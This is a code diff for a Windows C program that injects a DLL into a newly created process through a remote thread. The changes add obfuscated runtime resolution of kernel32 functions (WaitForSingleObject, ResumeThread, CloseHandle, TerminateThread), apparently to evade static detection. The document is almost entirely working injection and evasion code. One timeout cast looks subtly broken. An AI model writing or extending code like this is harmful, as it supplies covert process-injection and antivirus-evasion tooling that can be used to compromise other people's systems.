@@ -68,7 +68,6 @@ void StealthExec(HANDLE hProc, const char *dllN)
 
     // Load Remote DLL
     hThreadRemote = ((pCRT_t)pCRT)(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
-    // hThreadRemote = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pLLoad, memLoc, 0, NULL);
     if (!hThreadRemote)
     {
         myDebug(DEBUG_ERROR, "Thread creation failed. Err: %lu", GetLastError());
@@ -77,16 +76,20 @@ void StealthExec(HANDLE hProc, const char *dllN)
     else
     {
         myDebug(DEBUG_INFO, "Thread creation succeed. Waiting 5 sec for thread to resume");
-        DWORD waitResult = WaitForSingleObject(hThreadRemote, 5000); // Wait for 5 seconds
+        pWaitForSingleObject_t pWaitForSingleObject = (pWaitForSingleObject_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]WaitForSingleObject"));
+        DWORD waitResult = pWaitForSingleObject(hThreadRemote, (LPDWORD)5000); // Wait for 5 seconds
+        pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
         if ((waitResult == WAIT_TIMEOUT) || (waitResult == WAIT_FAILED))
         {
             myDebug(DEBUG_ERROR, "WaitForSingleObject failed! Error: %lu", GetLastError());
-            TerminateThread(hThreadRemote, 0); // Kill stuck thread
-            CloseHandle(hThreadRemote);
+            pTerminateThread_t pTerminateThread = (pTerminateThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]TerminateThread"));
+            pTerminateThread(hThreadRemote, 0); // Kill stuck thread
+            pCloseHandle(hThreadRemote);
             return;
         }
-        ResumeThread(hThreadRemote);
-        CloseHandle(hThreadRemote);
+        pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
+        pResumeThread(hThreadRemote);
+        pCloseHandle(hThreadRemote);
         myDebug(DEBUG_SUCCESS, "Successfully injected module via RemoteThread");
     }
     return;
@@ -123,7 +126,7 @@ int main(int argc, char *argv[])
     pCPA_t pCPA = (pCPA_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CreateProcessA"));
 
     if (!pCPA) {
-        printf("[!] Failed to resolve CreateProcessA\n");
+        myDebug(DEBUG_ERROR, "Failed to resolve CreateProcessA");
         return -1;
     }
 
@@ -139,9 +142,11 @@ int main(int argc, char *argv[])
     StealthExec(pInfo.hProcess, dllPath);
 
     // Resume Execution
-    ResumeThread(pInfo.hThread);
-    CloseHandle(pInfo.hProcess);
-    CloseHandle(pInfo.hThread);
+    pResumeThread_t pResumeThread = (pResumeThread_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]ResumeThread"));
+    pResumeThread(pInfo.hThread);
+    pCloseHandle_t pCloseHandle = (pCloseHandle_t)GetMod(obfs_decode(DECKEY, "[OBFS_ENC]kernel32.dll"), obfs_decode(DECKEY, "[OBFS_ENC]CloseHandle"));
+    pCloseHandle(pInfo.hProcess);
+    pCloseHandle(pInfo.hThread);
     myDebug(DEBUG_INFO, "%s is now running.", obfs_decode(DECKEY, procName));
 
     return 0;
